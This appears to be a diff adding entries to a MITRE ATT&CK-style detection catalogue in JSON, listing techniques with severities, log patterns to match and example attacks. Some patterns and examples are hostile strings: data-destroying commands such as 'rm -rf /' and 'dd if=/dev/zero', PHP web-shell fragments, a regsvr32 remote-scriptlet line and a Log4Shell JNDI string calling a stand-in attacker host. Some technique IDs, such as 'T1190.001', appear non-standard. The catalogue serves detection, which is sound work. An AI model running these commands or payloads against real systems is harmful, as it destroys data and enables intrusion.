+      "name": "Local Accounts",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Use local accounts for initial access or persistence.",
+      "log_patterns": [
+        "local account login",
+        "admin login",
+        "root login unusual",
+        "local user"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1078/003/",
+      "examples": [
+        "Local admin account used from unusual IP",
+        "Default credentials used on appliance",
+        "Shared local admin account abuse"
+      ]
+    },
+    {
+      "id": "T1505",
+      "name": "Server Software Component",
+      "tactic": "TA0003",
+      "severity": "CRITICAL",
+      "description": "Implant software components like web shells for persistence.",
+      "log_patterns": [
+        "webshell",
+        "cmd.php",
+        "shell.aspx",
+        "chopper",
+        "POST to .php unusual",
+        "eval(base64"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1505/",
+      "examples": [
+        "China Chopper webshell deployed",
+        "PHP webshell in /var/www",
+        "ASPX webshell on IIS server"
+      ]
+    },
+    {
+      "id": "T1218",
+      "name": "System Binary Proxy Execution",
+      "tactic": "TA0005",
+      "severity": "HIGH",
+      "description": "Use trusted system binaries to proxy execution of malicious code.",
+      "log_patterns": [
+        "regsvr32",
+        "mshta",
+        "certutil decode",
+        "rundll32",
+        "wmic",
+        "LOLBin"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1218/",
+      "examples": [
+        "certutil.exe -decode payload",
+        "mshta.exe executing remote HTA",
+        "regsvr32 /s /n /u /i:http:// scrobj.dll"
+      ]
+    },
+    {
+      "id": "T1574",
+      "name": "Hijack Execution Flow",
+      "tactic": "TA0004",
+      "severity": "HIGH",
+      "description": "Intercept how OS runs programs to gain elevated access.",
+      "log_patterns": [
+        "DLL hijack",
+        "library preload",
+        "PATH manipulation",
+        "dylib hijack",
+        "search order"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1574/",
+      "examples": [
+        "DLL search order hijacking",
+        "LD_PRELOAD injection",
+        "Dylib hijacking on macOS"
+      ]
+    },
+    {
+      "id": "T1134",
+      "name": "Access Token Manipulation",
+      "tactic": "TA0004",
+      "severity": "CRITICAL",
+      "description": "Modify access tokens to operate under a different user context.",
+      "log_patterns": [
+        "token impersonation",
+        "SeImpersonatePrivilege",
+        "runas",
+        "incognito",
+        "token stealing"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1134/",
+      "examples": [
+        "Potato attacks for token impersonation",
+        "Incognito token stealing",
+        "Azure AD token theft"
+      ]
+    },
+    {
+      "id": "T1556",
+      "name": "Modify Authentication Process",
+      "tactic": "TA0006",
+      "severity": "CRITICAL",
+      "description": "Modify authentication mechanisms to access credentials.",
+      "log_patterns": [
+        "PAM module modified",
+        "authentication library replaced",
+        "custom auth bypass",
+        "pam_unix patched"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1556/",
+      "examples": [
+        "Malicious PAM module accepting master password",
+        "LSASS patched for credential bypass",
+        "Custom auth provider with backdoor"
+      ]
+    },
+    {
+      "id": "T1087",
+      "name": "Account Discovery",
+      "tactic": "TA0007",
+      "severity": "LOW",
+      "description": "Enumerate accounts on the system and domain.",
+      "log_patterns": [
+        "cat /etc/passwd",
+        "net user",
+        "id command",
+        "whoami",
+        "getent passwd",
+        "LDAP query"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1087/",
+      "examples": [
+        "cat /etc/passwd executed post-exploit",
+        "net user /domain for AD enumeration",
+        "LDAP dump with ldapsearch"
+      ]
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "TA0007",
+      "severity": "LOW",
+      "description": "Look up network configuration and settings.",
+      "log_patterns": [
+        "ifconfig",
+        "ip addr",
+        "netstat",
+        "route print",
+        "arp -a",
+        "ipconfig"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1016/",
+      "examples": [
+        "ip addr show for network mapping",
+        "netstat -ano for connections",
+        "route print for gateway discovery"
+      ]
+    },
+    {
+      "id": "T1008",
+      "name": "Fallback Channels",
+      "tactic": "TA0011",
+      "severity": "MEDIUM",
+      "description": "Use backup C2 channels in case primary is disrupted.",
+      "log_patterns": [
+        "backup C2",
+        "alternate domain",
+        "fallback IP",
+        "domain rotation",
+        "DGA"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1008/",
+      "examples": [
+        "DGA-based C2 with multiple domains",
+        "Peer-to-peer C2 fallback",
+        "Backup C2 over Tor"
+      ]
+    },
+    {
+      "id": "T1102",
+      "name": "Web Service",
+      "tactic": "TA0011",
+      "severity": "MEDIUM",
+      "description": "Use external web services for C2 communication.",
+      "log_patterns": [
+        "Pastebin request",
+        "GitHub API",
+        "Discord webhook",
+        "Slack outbound",
+        "Twitter API C2"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1102/",
+      "examples": [
+        "C2 via GitHub Gist",
+        "Cobalt Strike over legitimate SaaS",
+        "Twitter API used as C2 channel"
+      ]
+    },
+    {
+      "id": "T1030",
+      "name": "Data Transfer Size Limits",
+      "tactic": "TA0010",
+      "severity": "LOW",
+      "description": "Limit the amount of data transferred to avoid detection.",
+      "log_patterns": [
+        "slow exfiltration",
+        "low-rate upload",
+        "chunked transfer unusual",
+        "small burst upload"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1030/",
+      "examples": [
+        "Slow exfil to avoid bandwidth thresholds",
+        "Chunked data over time across different IPs",
+        "File split into small pieces for exfil"
+      ]
+    },
+    {
+      "id": "T1491",
+      "name": "Defacement",
+      "tactic": "TA0040",
+      "severity": "HIGH",
+      "description": "Modify visual content to deliver a message or intimidate.",
+      "log_patterns": [
+        "index.html modified",
+        "web defacement",
+        "website changed",
+        "home page altered"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1491/",
+      "examples": [
+        "Website defacement with political message",
+        "Internal portal defaced by insider",
+        "Hacktivism campaign defacing news site"
+      ]
+    },
+    {
+      "id": "T1561",
+      "name": "Disk Wipe",
+      "tactic": "TA0040",
+      "severity": "CRITICAL",
+      "description": "Wipe or corrupt contents of storage devices.",
+      "log_patterns": [
+        "dd if=/dev/zero",
+        "shred -n",
+        "wiper malware",
+        "MBR overwrite",
+        "disk destroy"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1561/",
+      "examples": [
+        "Shamoon wiper malware",
+        "dd wiping disk to zero",
+        "MBR overwrite rendering system unbootable"
+      ]
+    },
+    {
+      "id": "T1485",
+      "name": "Data Destruction",
+      "tactic": "TA0040",
+      "severity": "CRITICAL",
+      "description": "Destroy data and files to make them unrecoverable.",
+      "log_patterns": [
+        "rm -rf /",
+        "shred",
+        "srm",
+        "secure delete",
+        "DROP TABLE",
+        "database wipe"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1485/",
+      "examples": [
+        "rm -rf /* on critical servers",
+        "Secure wipe of backup archives",
+        "DROP TABLE cascade on production DB"
+      ]
+    },
+    {
+      "id": "T1601",
+      "name": "Modify System Image",
+      "tactic": "TA0005",
+      "severity": "CRITICAL",
+      "description": "Make changes to the OS image to enable persistence.",
+      "log_patterns": [
+        "kernel module load",
+        "rootkit",
+        "LKM",
+        "kmod",
+        "/boot modified",
+        "grub tampered"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1601/",
+      "examples": [
+        "Rootkit loaded as kernel module",
+        "Bootkit in MBR",
+        "Malicious kernel module for keylogging"
+      ]
+    },
+    {
+      "id": "T1014",
+      "name": "Rootkit",
+      "tactic": "TA0005",
+      "severity": "CRITICAL",
+      "description": "Use rootkits to hide presence and maintain access.",
+      "log_patterns": [
+        "rootkit detected",
+        "LKM hidden",
+        "proc hidden",
+        "file hidden",
+        "sys_call_table hooked"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1014/",
+      "examples": [
+        "Azazel rootkit hiding processes",
+        "Necurs rootkit on Windows",
+        "Linux Diamorphine rootkit"
+      ]
+    },
+    {
+      "id": "T1542",
+      "name": "Pre-OS Boot",
+      "tactic": "TA0003",
+      "severity": "CRITICAL",
+      "description": "Achieve persistence by modifying components before OS boots.",
+      "log_patterns": [
+        "UEFI modified",
+        "Secure Boot disabled",
+        "bootloader tampered",
+        "MBR rootkit",
+        "firmware modified"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1542/",
+      "examples": [
+        "LoJax UEFI rootkit",
+        "Boothole GRUB2 vulnerability",
+        "MBR bootkit (Mebroot)"
+      ]
+    },
+    {
+      "id": "T1525",
+      "name": "Implant Internal Image",
+      "tactic": "TA0003",
+      "severity": "HIGH",
+      "description": "Implant cloud or container images with malicious code.",
+      "log_patterns": [
+        "docker image modified",
+        "ECR push anomaly",
+        "container image tampered",
+        "base image poisoned"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1525/",
+      "examples": [
+        "Poisoned Docker base image",
+        "Malicious container pushed to private registry",
+        "Compromised AMI in AWS"
+      ]
+    },
+    {
+      "id": "T1553",
+      "name": "Subvert Trust Controls",
+      "tactic": "TA0005",
+      "severity": "HIGH",
+      "description": "Undermine trust mechanisms like digital signatures.",
+      "log_patterns": [
+        "self-signed cert",
+        "code signing bypass",
+        "certificate pinning disabled",
+        "trusted cert revoked"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1553/",
+      "examples": [
+        "Self-signed code certificate for malware",
+        "Stolen Microsoft code-signing cert",
+        "SolarWinds signed backdoor"
+      ]
+    },
+    {
+      "id": "T1611",
+      "name": "Escape to Host",
+      "tactic": "TA0004",
+      "severity": "CRITICAL",
+      "description": "Break out of a container to the underlying host.",
+      "log_patterns": [
+        "container escape",
+        "docker.sock access",
+        "privileged container",
+        "namespace breakout",
+        "cgroup escape"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1611/",
+      "examples": [
+        "Docker socket mount for host access",
+        "runc CVE-2019-5736 container escape",
+        "Privileged container with host PID namespace"
+      ]
+    },
+    {
+      "id": "T1590",
+      "name": "Gather Victim Network Information",
+      "tactic": "TA0043",
+      "severity": "LOW",
+      "description": "Gather information about the target network prior to attack.",
+      "log_patterns": [
+        "OSINT scan",
+        "WHOIS query",
+        "certificate transparency",
+        "BGP route query",
+        "shodan scan"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1590/",
+      "examples": [
+        "Shodan scan for exposed services",
+        "Certificate transparency log enumeration",
+        "WHOIS and ASN lookup"
+      ]
+    },
+    {
+      "id": "T1114",
+      "name": "Email Collection",
+      "tactic": "TA0009",
+      "severity": "HIGH",
+      "description": "Collect email from victim networks.",
+      "log_patterns": [
+        "IMAP access anomaly",
+        "mailbox export",
+        "email forwarding rule",
+        "PST export",
+        "email dump"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1114/",
+      "examples": [
+        "Exchange EWS mass email collection",
+        "IMAP session collecting all mailboxes",
+        "Auto-forwarding rule to external address"
+      ]
+    },
+    {
+      "id": "T1528",
+      "name": "Steal Application Access Token",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Steal application access tokens for OAuth/SAML abuse.",
+      "log_patterns": [
+        "OAuth token stolen",
+        "Bearer token",
+        "SAML abuse",
+        "JWT stolen",
+        "access token exfil"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1528/",
+      "examples": [
+        "OAuth token theft via malicious app",
+        "SAML golden ticket",
+        "JWT secret compromised for token forgery"
+      ]
+    },
+    {
+      "id": "T1539",
+      "name": "Steal Web Session Cookie",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Steal web session cookies for authenticated session access.",
+      "log_patterns": [
+        "cookie theft",
+        "session hijack",
+        "document.cookie",
+        "XSS cookie exfil"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1539/",
+      "examples": [
+        "XSS attack stealing session cookies",
+        "Malware browser extension extracting cookies",
+        "Man-in-the-browser cookie theft"
+      ]
+    },
+    {
+      "id": "T1606",
+      "name": "Forge Web Credentials",
+      "tactic": "TA0006",
+      "severity": "CRITICAL",
+      "description": "Forge credentials for web authentication bypasses.",
+      "log_patterns": [
+        "SAML forgery",
+        "golden SAML",
+        "JWT forge",
+        "token replay",
+        "silver ticket"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1606/",
+      "examples": [
+        "Golden SAML attack (SolarWinds)",
+        "JWT none algorithm attack",
+        "Silver ticket forging Kerberos tickets"
+      ]
+    },
+    {
+      "id": "T1580",
+      "name": "Cloud Infrastructure Discovery",
+      "tactic": "TA0007",
+      "severity": "MEDIUM",
+      "description": "Attempt to discover cloud infrastructure and resources.",
+      "log_patterns": [
+        "aws describe",
+        "gcloud list",
+        "az vm list",
+        "cloud API enumeration",
+        "S3 bucket list"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1580/",
+      "examples": [
+        "aws s3 ls for bucket enumeration",
+        "GCP project enumeration",
+        "Azure subscription API scan"
+      ]
+    },
+    {
+      "id": "T1552",
+      "name": "Unsecured Credentials",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Find and abuse insecure credentials in storage.",
+      "log_patterns": [
+        "credentials in env",
+        "password in config",
+        "AWS key in code",
+        "secret in git",
+        "plaintext password"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1552/",
+      "examples": [
+        "AWS secret key committed to GitHub",
+        "Password in environment variable",
+        "SSH private key in /tmp with world read"
+      ]
+    },
+    {
+      "id": "T1570",
+      "name": "Lateral Tool Transfer",
+      "tactic": "TA0008",
+      "severity": "HIGH",
+      "description": "Transfer tools between systems to support lateral movement.",
+      "log_patterns": [
+        "scp between internal",
+        "psexec tool transfer",
+        "impacket",
+        "tool staged internally",
+        "smb copy"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1570/",
+      "examples": [
+        "Impacket smbclient tool transfer",
+        "scp of Mimikatz to internal host",
+        "psexec binary uploaded and executed"
+      ]
+    },
+    {
+      "id": "T1537",
+      "name": "Transfer Data to Cloud Account",
+      "tactic": "TA0010",
+      "severity": "HIGH",
+      "description": "Transfer data to a cloud account for exfiltration.",
+      "log_patterns": [
+        "aws s3 sync",
+        "gsutil -m cp",
+        "rclone to cloud",
+        "azure blob upload",
+        "cloud exfil"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1537/",
+      "examples": [
+        "Data synced to attacker S3 bucket",
+        "Google Drive API upload of secrets",
+        "Azure Blob Storage exfiltration via SAS token"
+      ]
+    },
+    {
+      "id": "T1566.001",
+      "name": "Spearphishing Attachment",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Adversaries send spearphishing emails with malicious attachments to gain access.",
+      "log_patterns": [
+        "malicious attachment",
+        "macro enabled",
+        "office exploit",
+        "pdf exploit",
+        "zip attachment executed"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1566/001/",
+      "examples": [
+        "Word doc with malicious macro sent to finance team",
+        "PDF exploit triggering CVE-2021-21017",
+        "Zipped JS file in phishing email"
+      ]
+    },
+    {
+      "id": "T1078.004",
+      "name": "Cloud Accounts",
+      "tactic": "TA0001",
+      "severity": "HIGH",
+      "description": "Adversaries obtain and abuse cloud service accounts for initial access.",
+      "log_patterns": [
+        "cloud login unusual",
+        "AWS root login",
+        "GCP service account",
+        "Azure AD login anomaly",
+        "cloud credentials used"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1078/004/",
+      "examples": [
+        "AWS root account used from unusual IP",
+        "GCP service account key leaked in public repo",
+        "Azure AD compromised via password spray"
+      ]
+    },
+    {
+      "id": "T1195.002",
+      "name": "Compromise Software Supply Chain",
+      "tactic": "TA0001",
+      "severity": "CRITICAL",
+      "description": "Manipulate application software prior to receipt by a final consumer.",
+      "log_patterns": [
+        "npm install suspicious",
+        "pip package checksum",
+        "build pipeline access",
+        "dependency confusion",
+        "typosquatting package"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1195/002/",
+      "examples": [
+        "event-stream npm package backdoor",
+        "PyPI package with hidden exec",
+        "Dependency confusion in internal repo"
+      ]
+    },
+    {
+      "id": "T1059.006",
+      "name": "Python",
+      "tactic": "TA0002",
+      "severity": "HIGH",
+      "description": "Adversaries abuse Python to execute malicious code.",
+      "log_patterns": [
+        "python -c exec",
+        "python3 -c",
+        "import socket",
+        "subprocess.call",
+        "os.system python",
+        "python reverse shell"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1059/006/",
+      "examples": [
+        "Python one-liner reverse shell",
+        "exec(base64.b64decode(...)) pattern",
+        "Python script spawning subprocess for C2"
+      ]
+    },
+    {
+      "id": "T1543.002",
+      "name": "Systemd Service",
+      "tactic": "TA0003",
+      "severity": "HIGH",
+      "description": "Create or modify systemd services to establish persistence.",
+      "log_patterns": [
+        "systemctl enable",
+        "new service file",
+        "unit file created",
+        "/etc/systemd/system",
+        "ExecStart suspicious"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1543/002/",
+      "examples": [
+        "Malicious .service file in /etc/systemd/system",
+        "ExecStart pointing to /tmp executable",
+        "Systemd timer for persistence"
+      ]
+    },
+    {
+      "id": "T1053.003",
+      "name": "Cron",
+      "tactic": "TA0003",
+      "severity": "MEDIUM",
+      "description": "Abuse cron jobs for persistent execution.",
+      "log_patterns": [
+        "crontab -l",
+        "cron job added",
+        "crontab modification",
+        "/etc/cron.d write",
+        "anacron"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1053/003/",
+      "examples": [
+        "* * * * * /tmp/.malware added to crontab",
+        "Cron job calling wget for C2 polling",
+        "Persistence via /etc/cron.hourly/"
+      ]
+    },
+    {
+      "id": "T1027.004",
+      "name": "Compile After Delivery",
+      "tactic": "TA0005",
+      "severity": "MEDIUM",
+      "description": "Deliver source code to evade detection, compile on target.",
+      "log_patterns": [
+        "gcc compile",
+        "g++ compile",
+        "msbuild",
+        "make install",
+        "compile on target"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1027/004/",
+      "examples": [
+        "C source code delivered and compiled with gcc",
+        "MSBuild.exe compiling payload",
+        "Go binary compiled on victim system"
+      ]
+    },
+    {
+      "id": "T1110.003",
+      "name": "Password Spraying",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Use a single or small list of commonly used passwords against many accounts.",
+      "log_patterns": [
+        "multiple accounts failed",
+        "password spray",
+        "same password tried",
+        "low-rate auth failure many users",
+        "spray attack"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1110/003/",
+      "examples": [
+        "1 failed login for 1000 accounts with Password123",
+        "Azure AD password spray via legacy auth",
+        "OWA password spray with seasonal passwords"
+      ]
+    },
+    {
+      "id": "T1110.004",
+      "name": "Credential Stuffing",
+      "tactic": "TA0006",
+      "severity": "HIGH",
+      "description": "Use lists of compromised credentials to authenticate against systems.",
+      "log_patterns": [
+        "credential stuffing",
+        "breached credentials",
+        "combo list",
+        "account takeover",
+        "multiple accounts login"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1110/004/",
+      "examples": [
+        "Automated login attempts with leaked combo lists",
+        "Account takeover after large data breach",
+        "Stuffing attack against API endpoints"
+      ]
+    },
+    {
+      "id": "T1021.001",
+      "name": "Remote Desktop Protocol",
+      "tactic": "TA0008",
+      "severity": "HIGH",
+      "description": "Use RDP to move laterally through environments.",
+      "log_patterns": [
+        "RDP connection",
+        "3389",
+        "rdp session",
+        "mstsc",
+        "remote desktop login"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1021/001/",
+      "examples": [
+        "RDP hopping between internal hosts",
+        "BlueKeep RDP exploitation",
+        "RDP session opened from compromised host"
+      ]
+    },
+    {
+      "id": "T1021.002",
+      "name": "SMB/Windows Admin Shares",
+      "tactic": "TA0008",
+      "severity": "HIGH",
+      "description": "Use SMB shares for lateral movement.",
+      "log_patterns": [
+        "net use",
+        "IPC$ connection",
+        "admin$ share",
+        "C$ access",
+        "smb lateral",
+        "psexec smb"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1021/002/",
+      "examples": [
+        "net use \\\\target\\admin$ for lateral move",
+        "PsExec over SMB",
+        "Impacket smbexec for remote execution"
+      ]
+    },
+    {
+      "id": "T1071.004",
+      "name": "DNS",
+      "tactic": "TA0011",
+      "severity": "HIGH",
+      "description": "Use DNS for C2 communications.",
+      "log_patterns": [
+        "DNS C2",
+        "dnscat",
+        "iodine",
+        "dns tunnel",
+        "TXT record C2",
+        "DNS beaconing"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1071/004/",
+      "examples": [
+        "dnscat2 DNS C2 tunnelling",
+        "Cobalt Strike DNS beacon",
+        "Data exfiltrated via DNS TXT records"
+      ]
+    },
+    {
+      "id": "T1505.003",
+      "name": "Web Shell",
+      "tactic": "TA0003",
+      "severity": "CRITICAL",
+      "description": "Attacker uploads a web shell to a server for persistent access.",
+      "log_patterns": [
+        "webshell upload",
+        "cmd.php",
+        "shell.php",
+        "POST to .php with exec",
+        "eval($_POST",
+        "passthru($_GET"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1505/003/",
+      "examples": [
+        "China Chopper webshell via file upload",
+        "PHP eval webshell on WordPress",
+        "ASPX webshell uploaded via vulnerable endpoint"
+      ]
+    },
+    {
+      "id": "T1190.001",
+      "name": "Log4Shell Exploitation",
+      "tactic": "TA0001",
+      "severity": "CRITICAL",
+      "description": "Exploit Log4Shell (CVE-2021-44228) via JNDI injection.",
+      "log_patterns": [
+        "jndi:ldap",
+        "log4shell",
+        "CVE-2021-44228",
+        "${jndi:",
+        "ldap://attacker"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1190/",
+      "examples": [
+        "${jndi:ldap://attacker.com/a} in User-Agent",
+        "Log4Shell in VMware vCenter",
+        "Ubiquitous Java logging library RCE"
+      ]
+    },
+    {
+      "id": "T1078.001",
+      "name": "Default Accounts",
+      "tactic": "TA0001",
+      "severity": "MEDIUM",
+      "description": "Use default usernames and passwords that are preset to log into a system.",
+      "log_patterns": [
+        "default credentials",
+        "admin:admin",
+        "root:root",
+        "default password",
+        "factory password"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1078/001/",
+      "examples": [
+        "IoT device accessed with admin:admin",
+        "Router compromised via factory default",
+        "Camera accessed with root:root"
+      ]
+    },
+    {
+      "id": "T1190.002",
+      "name": "Spring4Shell",
+      "tactic": "TA0001",
+      "severity": "CRITICAL",
+      "description": "Exploit Spring Framework RCE vulnerability (CVE-2022-22965).",
+      "log_patterns": [
+        "spring4shell",
+        "CVE-2022-22965",
+        "class.module.classLoader",
+        "spring rce",
+        "classLoader exploit"
+      ],
+      "mitre_url": "https://attack.mitre.org/techniques/T1190/",
+      "examples": [
+        "Spring4Shell via crafted HTTP request",
+        "WAF bypass for Spring4Shell",
+        "Mass scanning for Spring Boot endpoints"
+      ]
+    }
+  ]
+}
